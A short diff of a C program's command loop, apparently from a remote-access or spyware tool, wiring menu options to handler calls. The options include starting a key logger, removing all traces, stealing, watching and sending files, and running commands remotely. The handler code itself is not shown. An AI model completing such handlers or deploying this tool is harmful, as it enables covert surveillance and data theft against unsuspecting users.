@@ -116,12 +116,15 @@ int main(void){
         switch(choice){
             case UNINSTALL:
                 printf("Removing all traces...\n");
+                cmd_uninstall(&ctx);
                 break;
             case START_KL:
                 printf("Starting key logger...\n");
+                cmd_start_kl(&ctx);
                 break;
             case GET_FILE:
                 printf("Get file\n");
+                cmd_get_file(&ctx);
                 break;
             case SEND_FILE:
                 printf("Send file\n");
@@ -129,15 +132,19 @@ int main(void){
                 break;
             case WATCH_FILE:
                 printf("Watching file...\n");
+                cmd_watch_file(&ctx);
                 break;
             case WATCH_DIR:
                 printf("Watching dir...\n");
+                cmd_watch_dir(&ctx);
                 break;
             case REMOTE_RUN:
                 printf("Running remotely\n");
+                cmd_remote_run(&ctx);
                 break;
             case DISCONNECT:
                 run = 0;
+                cmd_disconnect(&ctx);
                 break;
             default:
                 return EXIT_FAILURE;
